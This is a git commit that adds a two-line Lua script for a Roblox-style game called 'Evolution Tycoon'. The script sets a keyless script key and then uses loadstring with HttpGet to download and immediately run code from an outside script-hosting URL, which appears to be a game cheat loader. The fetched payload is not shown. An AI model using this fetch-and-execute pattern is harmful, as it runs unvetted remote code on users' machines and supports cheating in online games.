f4288ee8493558d11cd0305569f28d1ce5f229d7
hfejjkebr-oss <hfejjkebr@gmail.com>
2026-09-19 21:25:42 +0700

    Add script loading functionality to evolution tycoon

---
+++ 2_PLAYER_Evolution_Tycoon.lua
@@ -0,0 +1,2 @@
+getgenv().SCRIPT_KEY = "KEYLESS"
+loadstring(game:HttpGet("https://api.jnkie.com/api/v1/luascripts/public/8c180c4577573c44a2b66c0087b86adb39a47372e61b9adf5652a0681818e77f/download"))()
